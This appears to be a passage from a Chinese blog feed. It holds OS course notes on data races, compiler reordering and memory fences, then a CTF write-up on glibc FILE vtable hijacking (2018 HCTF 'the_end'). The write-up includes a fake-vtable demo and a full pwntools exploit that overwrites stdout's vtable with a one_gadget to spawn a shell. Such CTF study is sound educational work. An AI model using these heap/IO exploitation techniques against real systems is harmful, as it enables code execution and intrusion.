alt="image-20230404235238898"></p><p>具体来说，当一个线程正在读取sum的值时，另一个线程可能已经修改了sum的值，但是第一个线程并不知道。这可能导致一个线程覆盖了另一个线程的结果，从而导致最终结果错误。</p><p>sum++翻译为汇编是三条指令，取出，+1，写回，这也就是我们单处理器为什么会出错原因</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000145A 48 8B 05 DF 31 00 00          mov     rax, cs:sum</span><br><span class="line">.text:0000000000001461 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001465 48 89 05 D4 31 00 00          mov     cs:sum, rax</span><br></pre></td></tr></table></figure><p>我们用内联汇编把sum++改为一句</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;add $1,%0&quot;</span>:<span class="string">&quot;+m&quot;</span>(sum))</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000145A 83 05 DF 31 00 00 01          add     dword ptr cs:sum, 1</span><br></pre></td></tr></table></figure><p>此时单核处理器没有多处理器乱序的并行，可以正常得到结果</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405000115259.png" alt="image-20230405000115259"></p><p>多核处理器依旧出差，不过误差低了一点</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405000145046.png" alt="image-20230405000145046"></p><h2 id="顺序的丧失"><a href="#顺序的丧失" class="headerlink" title="顺序的丧失"></a>顺序的丧失</h2><ul><li>用gcc对程序进行-O1的优化发现每次运行结果都是sum &#x3D; 100000000</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001223</span><br><span class="line">.text:0000000000001223                               ; void __cdecl Tsum()</span><br><span class="line">.text:0000000000001223                               public Tsum</span><br><span class="line">.text:0000000000001223                               Tsum proc near                          ; DATA XREF: main+5↓o</span><br><span class="line">.text:0000000000001223                               ; __unwind &#123;</span><br><span class="line">.text:0000000000001223 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000001227 48 8B 15 12 2E 00 00          mov     rdx, cs:sum</span><br><span class="line">.text:000000000000122E 48 8D 42 01                   lea     rax, [rdx+1]</span><br><span class="line">.text:0000000000001232 48 81 C2 01 E1 F5 05          add     rdx, 5F5E101h</span><br><span class="line">.text:0000000000001232</span><br><span class="line">.text:0000000000001239</span><br><span class="line">.text:0000000000001239                               loc_1239:                               ; CODE XREF: Tsum+20↓j</span><br><span class="line">.text:0000000000001239 48 89 C1                      mov     rcx, rax</span><br><span class="line">.text:000000000000123C 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001240 48 39 D0                      cmp     rax, rdx</span><br><span class="line">.text:0000000000001243 75 F4                         jnz     short loc_1239</span><br><span class="line">.text:0000000000001243</span><br><span class="line">.text:0000000000001245 48 89 0D F4 2D 00 00          mov     cs:sum, rcx</span><br><span class="line">.text:000000000000124C C3                            retn</span><br></pre></td></tr></table></figure><p>-01的优化保留了循环，但是优化了每次写回内存的操作，用rcx寄存器代替</p><p><code>mov     cs:sum, rcx</code>最后写回的这一步决定了<code>sum = 100000000</code></p><ul><li>-O2优化 每次运行结果sum &#x3D; 200000000</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001290</span>                               ; <span class="type">void</span> __cdecl <span class="title function_">Tsum</span><span class="params">()</span></span><br><span class="line">.text:0000000000001290                               public Tsum</span><br><span class="line">.text:0000000000001290                               Tsum proc near                          ; DATA XREF: main+<span class="number">5</span>↑o</span><br><span class="line">.text:<span class="number">0000000000001290</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000001290</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000001294</span> <span class="number">48</span> <span class="number">81</span> <span class="number">05</span> A1 <span class="number">2</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> E1 F5+add     cs:sum, <span class="number">5F</span>5E100h</span><br><span class="line">.text:<span class="number">0000000000001294</span> <span class="number">05</span></span><br><span class="line">.text:<span class="number">000000000000129F</span> C3                            retn</span><br></pre></td></tr></table></figure><p>循环也没有了，直接把正确结果一个add，得到正确结果，但是这只是一个假象，和前面一句add汇编一样，当一个线程正在读取sum的值时，另一个线程可能已经修改了sum的值，我们只是两个线程去add，只是错误得几率很小，我们把线程增加到14，14次竞争add就已经有可见概率错误了</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405004225147.png" alt="image-20230405004225147"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> done;</span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!done) &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一一段代码我们只编译不链接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -c test.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;join&gt;:</span><br><span class="line">   0:    f3 0f 1e fa          endbr64 </span><br><span class="line">   4:    55                   push   %rbp</span><br><span class="line">   5:    48 89 e5             mov    %rsp,%rbp</span><br><span class="line">   8:    90                   nop</span><br><span class="line">   9:    8b 05 00 00 00 00    mov    0x0(%rip),%eax        # f &lt;join+0xf&gt;</span><br><span class="line">   f:    85 c0                test   %eax,%eax</span><br><span class="line">  11:    74 f6                je     9 &lt;join+0x9&gt;</span><br><span class="line">  13:    90                   nop</span><br><span class="line">  14:    90                   nop</span><br><span class="line">  15:    5d                   pop    %rbp</span><br><span class="line">  16:    c3                   ret    </span><br></pre></td></tr></table></figure><p>没加优化，每一次都会把done取出来，判断done是否为0</p><p>-O1优化</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -O1 -c test.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;join&gt;:</span><br><span class="line">   <span class="number">0</span>:    f3 <span class="number">0f</span> <span class="number">1</span>e fa          endbr64 </span><br><span class="line">   <span class="number">4</span>:    <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%rip),%eax        <span class="meta"># a <span class="string">&lt;join+0xa&gt;</span></span></span><br><span class="line">   a:    <span class="number">85</span> c0                test   %eax,%eax</span><br><span class="line">   c:    <span class="number">74</span> fc                je     a &lt;join+<span class="number">0xa</span>&gt;</span><br><span class="line">   e:    c3                   ret    </span><br></pre></td></tr></table></figure><p>只进行了一次取出done，多次判断相当于</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(x=done))&#123;</span><br><span class="line">    <span class="keyword">while</span>(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们知道这个done为全局变量，万一被某个线程改掉了呢？就叛变了原本的逻辑</p><p>-O2优化</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;join&gt;:</span><br><span class="line">   0:    f3 0f 1e fa          endbr64 </span><br><span class="line">   4:    8b 05 00 00 00 00    mov    0x0(%rip),%eax        # a &lt;join+0xa&gt;</span><br><span class="line">   a:    85 c0                test   %eax,%eax</span><br><span class="line">   c:    75 02                jne    10 &lt;join+0x10&gt;</span><br><span class="line">   e:    eb fe                jmp    e &lt;join+0xe&gt;</span><br><span class="line">  10:    c3                   ret   </span><br></pre></td></tr></table></figure><p>更离谱了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!done)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解决办法</strong></p><p>给编译器加一下限制</p><ul><li><p>Memory Barrier</p><blockquote><p>asm volatile (“” ::: “memory”)</p><p>volatile告诉编译器不要对这条指令优化</p><p>memory 表示指令以不可预测的方式修改了内存， 强制gcc编译器假设RAM所有内存单元均被汇编指令修改，这样cpu中的registers和cache中已缓存的内存单元中的数据将作废。cpu将不得不在需要的时候重新读取内存中的数据。</p></blockquote></li><li><p>使用volatile变量</p><blockquote><p><strong>extern</strong> int <strong>volatile</strong> done;</p><p>volatile 指出 done 是随时可能发生变化的，每次使用它的时候必须从done的内存地址中读取，即使cache或寄存器里有</p></blockquote></li></ul><h2 id="可见性的丧失"><a href="#可见性的丧失" class="headerlink" title="可见性的丧失"></a>可见性的丧失</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">atomic_int</span> flag;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG atomic_load(&amp;flag)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG_XOR(val) atomic_fetch_xor(&amp;flag, val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT_FOR(cond) while (!(cond)) ;</span></span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_x_read_y</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> y_val;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=m&quot;</span>(x), <span class="string">&quot;=r&quot;</span>(y_val) : <span class="string">&quot;m&quot;</span>(y)</span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, y_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_y_read_x</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x_val;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, x_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T1</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">1</span>));</span><br><span class="line">    write_x_read_y();</span><br><span class="line">    FLAG_XOR(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T2</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">2</span>));</span><br><span class="line">    write_y_read_x();</span><br><span class="line">    FLAG_XOR(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tsync</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = y = <span class="number">0</span>;</span><br><span class="line">    __sync_synchronize(); <span class="comment">// full barrier</span></span><br><span class="line">    usleep(<span class="number">1</span>);            <span class="comment">// + delay</span></span><br><span class="line">    assert(FLAG == <span class="number">0</span>);</span><br><span class="line">    FLAG_XOR(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// T1 and T2 clear 0/1-bit, respectively</span></span><br><span class="line">    WAIT_FOR(FLAG == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(T1);</span><br><span class="line">  create(T2);</span><br><span class="line">  create(Tsync);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><p><a href="https://en.cppreference.com/w/c/atomic">https://en.cppreference.com/w/c/atomic</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/_005f_005fatomic-Builtins.html">https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/_005f_005fatomic-Builtins.html</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-4.4.7/gcc/Atomic-Builtins.html#Atomic-Builtins">https://gcc.gnu.org/onlinedocs/gcc-4.4.7/gcc/Atomic-Builtins.html#Atomic-Builtins</a></p><p>原子变量及原子操作是c11引入，&lt;stdatomic.h&gt;</p><p>原子变量的操作是原子操作(atomic operation),原子操作指的是不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，在同一个cpu时间片中完成,中间不会有任何的上下文切换。用于实现高效、正确、线程安全的并发编程</p></li></ul></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Built-in Function: <span class="type">void</span> __atomic_load (type *ptr, type *ret, <span class="type">int</span> memorder)</span><br><span class="line">This is the generic version of an atomic load. It returns the contents of *ptr in *ret.</span><br></pre></td></tr></table></figure><p>首先用来原子变量的flag的低两个bit当作开关</p><p>初始时为00，最低bit为1时T1打开，倒二bit为1时T2打开</p><p>Tsync是我们的控制线程中<code>FLAG_XOR(3)</code>同时把T1T2打开，然后T1T2同时执行，不管哪一个线程快一点慢一点，得到的结果只能是01 10 11，执行过后会把自己对应的开关置零关闭</p><p>根据该程序的状态机模型是不可能出现00的，但是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -O2 -g -o mem-ordering mem-ordering.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./mem-ordering | head -n <span class="number">10000</span> |sort| uniq -c</span><br><span class="line">   <span class="number">7970</span> <span class="number">0</span> <span class="number">0</span> </span><br><span class="line">   <span class="number">1756</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line">    <span class="number">274</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line"><span class="meta">#head -n 取前n行 sort排序后 uniq命令用于检查及删除文本文件中重复出现的行列 -c统计该行重复出现的次数</span></span><br></pre></td></tr></table></figure><p>导致这方面的原因来自多核处理器的微架构  <a href="https://www.bilibili.com/video/BV1844y1z7Dx">https://www.bilibili.com/video/BV1844y1z7Dx</a></p><p>为了实现流水线，需要一条指令拆分为更小的可执行单元，叫做micro-operations简称uOps，利用寄存器重命名和分支目标预测的技术，实现超标量乱序执行。</p><p>在代码级上，看上去似乎是一次执行一条指令，但是实际上是指令级并行，呈现出一种简单的顺序执行指令的表象。正好能获得机器级程序要求的顺序语义模型的效果。</p><p>具体到我们上面的程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     # &lt;-----------+</span><br><span class="line">movl $<span class="number">1</span>, (x)   #   |</span><br><span class="line">movl (y), %eax # --+</span><br></pre></td></tr></table></figure><p>我们FLAG_XOR(3)后，在多处理器系统中，当一个CPU对共享内存进行修改时，需要使其他CPU中的缓存无效，导致<code>movl $1, %0;</code>几乎总是cache miss的，cpu在找内存同时执行下一条和上一条无关的指令，导致了输出0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1    </span></span><br><span class="line"><span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span><br><span class="line">: <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span><br></pre></td></tr></table></figure><p><strong>实现一致性</strong></p><ul><li><p>Memory barrier:<a href="https://gcc.gnu.org/onlinedocs/gcc/_005f_005fsync-Builtins.html">__sync_synchronize()</a></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/41872203">好文</a></p><p>Built-in Function: <em>void</em> <strong>__sync_synchronize</strong> <em>(…)</em></p><p>This built-in function issues a full memory barrier.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __sync_synchronize (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* This issues the &quot;mfence&quot; instruction on x86/x86_64.  */</span></span><br><span class="line">  __asm__ __volatile__ (<span class="string">&quot;mfence&quot;</span> : : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们之前在解决顺序性，用到的asm volatile (“” ::: “memory”)引导编译器，而我们这次需要和硬件进行交流</p><p>防止这种CPU乱序，我们需要添加CPU memory fence。X86专门的memory fence指令是”mfence”；保证存访问操作完成后才能执行后续的内存访问操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span><br><span class="line"><span class="string">&quot;mfence;&quot;</span></span><br><span class="line"><span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./mem-ordering | head -n <span class="number">10000</span> |sort| uniq -c</span><br><span class="line">   <span class="number">1462</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line">    <span class="number">221</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line">   <span class="number">8317</span> <span class="number">1</span> <span class="number">1</span> </span><br></pre></td></tr></table></figure></blockquote></li><li><p>原子指令 </p><p>和我们的flag一样用原子变量</p><p><code>stdatomic.h</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vtable Hijack--2018 HCTF the_end</title>
      <link href="/2023/04/03/vtable-hijack/"/>
      <url>/2023/04/03/vtable-hijack/</url>
      
        <content type="html"><![CDATA[<p>通过之前的分析IO函数基本上都会取调用_IO_FILE_plus 的vtable里的函数指针，如果我们可以控制这个指针，就可以控制程序的执行流</p><h2 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h2><p>一种方法就是改vtable里的指针但是</p><p><img src="/2023/04/03/vtable-hijack/image-20230402114035931.png" alt="image-20230402114035931"></p><p>2.23libc里的_IO_file_jumps不可写的</p><p>那就只能伪造整个伪造_IO_FILE_plus 里的vtable为我们可写可控制的区域，比如我们alloc的堆</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> system_ptr 0x7ffff7a523a0;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)fp+<span class="number">0xd8</span>); <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="type">long</span> <span class="type">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fwrite函数会调用vtable里**__xsputn<strong>指向的</strong>libio&#x2F;fileops.c里的_IO_new_file_xsputn**函数，传入的参数为文件流结构体_IO_FILE,数据目标地址，读取总字节数</p><p><img src="/2023/04/03/vtable-hijack/image-20230402114847219.png" alt="image-20230402114847219"></p><p><img src="/2023/04/03/vtable-hijack/image-20230402115216810.png" alt="image-20230402115216810"></p><h2 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec the_end </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/the_end&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序有五个字节的任意地址写，泄露了libc的基地址</p><h3 id="hijack-IO-2-1-stdout-vtable-setbuf"><a href="#hijack-IO-2-1-stdout-vtable-setbuf" class="headerlink" title="hijack IO_2_1_stdout vtable _setbuf"></a>hijack <em>IO_2_1_stdout</em> vtable _setbuf</h3><p>程序最后调用了exit，前面对exit的sc解析调用 <code>exit</code> 后，会遍历 <code>_IO_list_all</code> ，挨个判断stderr stdout stdin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p>if条件成立会调用<code>vtable</code> 中 <code>_setbuf</code> 函数。_IO_UNBUFFERED为2</p><p><img src="/2023/04/03/vtable-hijack/image-20230403113124697.png" alt="image-20230403113124697"></p><p>只有stdout符合条件，所有我们劫持这个</p><p>两个字节修改stdout的vtable到一个伪造的vtable上，这个vtable的+0x58处必须是一个libc中的地址，因为我们只剩下三字节节的修改权力</p><p><img src="/2023/04/03/vtable-hijack/image-20230403121636295.png" alt="image-20230403121636295"></p><p>合适，所有选择0x7ffff7dd1968-0x58位置当作vtable距离stdin+0x30位置</p><p>再往vtable+0x58写入onegadget即可</p><p><img src="/2023/04/03/vtable-hijack/image-20230403125159852.png" alt="image-20230403125159852"></p><p>由于关闭了输出流，cat flag &gt; &amp;0或exec 1&gt;&amp;0重定向流</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./the_end&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25172&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">dbio= lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">ru(b<span class="number">&#x27;</span>a gift <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sleep_ad=int(ru(b&#x27;</span>,<span class="string">&#x27;),16)</span></span><br><span class="line"><span class="string">p(&#x27;</span>sleep<span class="number">&#x27;</span>,sleep_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;sleep&#x27;</span>,sleep_ad)</span><br><span class="line">base=sleep_ad-libc.dump(<span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">onegadget=base+<span class="number">0xf02b0</span></span><br><span class="line"><span class="built_in">stdin</span>=libc.dump(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>)+base</span><br><span class="line"><span class="built_in">stdout</span>=libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)+base</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="meta"># db(<span class="string">&#x27;b exit&#x27;</span>)</span></span><br><span class="line">ru(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>):</span><br><span class="line">    s(p64(<span class="built_in">stdout</span>+<span class="number">0xd8</span>+i))</span><br><span class="line">    s(p8(p64(<span class="built_in">stdin</span>+<span class="number">0x30</span>)[i]))</span><br><span class="line"><span class="meta"># dbio</span></span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    s(p64(<span class="built_in">stdin</span>+<span class="number">0x30</span>+<span class="number">0x58</span>+i))</span><br><span class="line">    s(p8(p64(onegadget)[i]))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
            <tag> Vtable Hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>main函数返回后(After main return)</title>
      <link href="/2023/04/02/main-return/"/>
      <url>/2023/04/02/main-return/</url>
      
